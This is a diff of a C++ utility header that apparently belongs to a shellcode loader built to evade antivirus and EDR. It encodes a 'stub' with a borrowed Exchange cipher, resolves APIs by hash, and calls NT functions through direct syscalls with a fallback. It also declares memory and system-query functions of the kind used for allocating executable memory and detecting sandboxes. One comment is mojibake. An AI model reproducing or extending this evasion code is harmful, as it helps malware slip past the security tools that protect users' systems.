@@ -135,7 +135,6 @@ namespace utils {
 #define mpbbS   (mpbbCrypt + 256)
 #define mpbbI   (mpbbCrypt + 512)
 
-	//从Exchange 邮件编码拿出来的，刚好可以简单编码一下stub
 	inline void CryptPermute(PVOID pv, int cb, BOOL fEncrypt)
 	{
 		byte* pb = (byte*)pv;
@@ -257,7 +256,7 @@ namespace utils {
 #pragma warning( pop )
 	}
 
-	//拿来的Hash算法
+	//锟斤拷锟斤拷锟斤拷Hash锟姐法
 	//String HASH
 	inline DWORD _HashStringRotr32A(PCHAR String) {
 		DWORD Value = 0;
@@ -271,6 +270,7 @@ namespace utils {
 
 LPVOID GetProcAddressbyHASH(HMODULE hModule, DWORD funcHash);
 HMODULE GetMoudlebyName(WCHAR* target);
+HMODULE myLoadLibrary(LPCWSTR moduleName);
 
 static auto& syscall = pigsyscall::syscall::get_instance();
 
@@ -284,19 +284,38 @@ public:
 	template<typename Ret, typename... Args>
 	static Ret Invoke(void* funcAddr, uint32_t funcHash, Args... args) {
 		if (isSyscall) {
-			return syscall.CallSyscall(funcHash, args...);
+			__try {
+				return syscall.CallSyscall<Ret>(funcHash, args...);
+			}
+			__except (EXCEPTION_EXECUTE_HANDLER) {
+				using FuncType = Ret(*)(Args...);
+				FuncType func = reinterpret_cast<FuncType>(funcAddr);
+				return func(args...);
+			}
 		}
 		else {
-			// **转换函数指针**
-			using FuncType = Ret(*)(Args...);
-			FuncType func = reinterpret_cast<FuncType>(funcAddr);
-			return func(args...);
+			if (funcAddr) {
+				using FuncType = Ret(*)(Args...);
+				FuncType func = reinterpret_cast<FuncType>(funcAddr);
+				return func(args...);
+			}
+			return (Ret)0xC0000001; // STATUS_UNSUCCESSFUL
 		}
 	}
 };
 
 EXTERN_C FunctionStruct NtAllocateVirtualMemoryStruct;
 EXTERN_C FunctionStruct NtProtectVirtualMemoryStruct;
+EXTERN_C FunctionStruct NtFreeVirtualMemoryStruct;
+EXTERN_C FunctionStruct NtQueryVirtualMemoryStruct;
+EXTERN_C FunctionStruct ZwQueryLicenseValueStruct;
+EXTERN_C FunctionStruct ZwQuerySystemInformationStruct;
+EXTERN_C FunctionStruct RtlExitUserProcessStruct;
+EXTERN_C FunctionStruct RtlInitUnicodeStringStruct;
+EXTERN_C FunctionStruct RtlImageDirectoryEntryToDataStruct;
+EXTERN_C FunctionStruct LdrGetDllHandleExStruct;
+EXTERN_C FunctionStruct NtIsProcessInJobStruct;
+EXTERN_C FunctionStruct NtCompressKeyStruct;
 
 void initAllFunc();
 
